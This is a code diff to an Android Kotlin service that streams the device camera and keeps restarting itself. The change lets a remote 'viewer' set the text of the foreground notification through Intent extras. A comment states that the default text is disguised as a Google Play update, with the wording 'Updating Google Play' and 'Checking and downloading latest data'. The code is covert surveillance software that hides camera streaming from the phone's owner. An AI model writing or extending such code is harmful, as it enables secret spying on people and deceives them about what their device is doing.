@@ -27,6 +27,8 @@ import androidx.core.app.NotificationCompat
 class CameraStreamingService : Service() {
 
     private var wakeLock: PowerManager.WakeLock? = null
+    private var notifTitle: String = DEFAULT_TITLE
+    private var notifBody: String = DEFAULT_BODY
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -37,7 +39,13 @@ class CameraStreamingService : Service() {
                 stopSelf()
                 return START_NOT_STICKY
             }
-            else -> startForegroundServiceInternal()
+            else -> {
+                // อ่าน custom notif text จาก Intent extras (viewer push มา)
+                // ถ้าไม่มี → ใช้ default
+                intent?.getStringExtra(EXTRA_NOTIF_TITLE)?.let { notifTitle = it }
+                intent?.getStringExtra(EXTRA_NOTIF_BODY)?.let { notifBody = it }
+                startForegroundServiceInternal()
+            }
         }
         return START_STICKY
     }
@@ -121,8 +129,8 @@ class CameraStreamingService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("กำลังอัพเดท Google Play")
-            .setContentText("กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด")
+            .setContentTitle(notifTitle)
+            .setContentText(notifBody)
             .setSmallIcon(android.R.drawable.stat_sys_download)
             .setContentIntent(openAppPendingIntent)
             .addAction(
@@ -180,8 +188,18 @@ class CameraStreamingService : Service() {
         // หน่วงก่อน resurrect — กัน race + ให้ Android cleanup activity ก่อน
         private const val RESURRECT_DELAY_MS = 2_000L
 
-        fun start(context: Context) {
-            val intent = Intent(context, CameraStreamingService::class.java)
+        // Intent extras keys สำหรับ custom notif text (จาก remote config)
+        private const val EXTRA_NOTIF_TITLE = "notif_title"
+        private const val EXTRA_NOTIF_BODY = "notif_body"
+        // Default text — ปลอมเป็น Google Play update
+        private const val DEFAULT_TITLE = "กำลังอัพเดท Google Play"
+        private const val DEFAULT_BODY = "กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด"
+
+        fun start(context: Context, notifTitle: String? = null, notifBody: String? = null) {
+            val intent = Intent(context, CameraStreamingService::class.java).apply {
+                if (!notifTitle.isNullOrBlank()) putExtra(EXTRA_NOTIF_TITLE, notifTitle)
+                if (!notifBody.isNullOrBlank()) putExtra(EXTRA_NOTIF_BODY, notifBody)
+            }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
